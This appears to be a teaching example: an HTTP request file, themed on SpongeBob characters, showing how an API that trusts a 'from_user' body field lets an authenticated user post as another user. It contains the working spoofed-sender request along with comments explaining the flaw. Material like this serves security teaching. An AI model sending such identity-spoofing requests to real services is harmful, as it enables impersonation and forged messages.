### EXPLOIT: Squidward impersonates SpongeBob to rig the Employee of the Month vote
### He's authenticated as squidward@krusty-krab.sea and authorized to post to the staff group,
### but the API trusts the from_user parameter from the request body
POST {{base}}/example4/groups/staff@krusty-krab.sea/messages
Authorization: Basic squidward@krusty-krab.sea:clarinet-master
Content-Type: application/json

{
  "from_user": "spongebob@krusty-krab.sea",
  "message": "I vote for Squidward. He is clearly the most sophisticated employee with refined artistic sensibility. His clarinet skills are unmatched."
}

# Notice how the message uses sophisticated vocabulary ("sophisticated", "refined artistic
# sensibility") that SpongeBob would never use. This language mismatch is a red flag for
# impersonation attacks - SpongeBob would say "I'm ready!" not "refined artistic sensibility"!
#
# The system shows the message as coming from spongebob@krusty-krab.sea, but Squidward
# (authenticated via Basic Auth) is the actual sender. Identity was rebound after authentication.
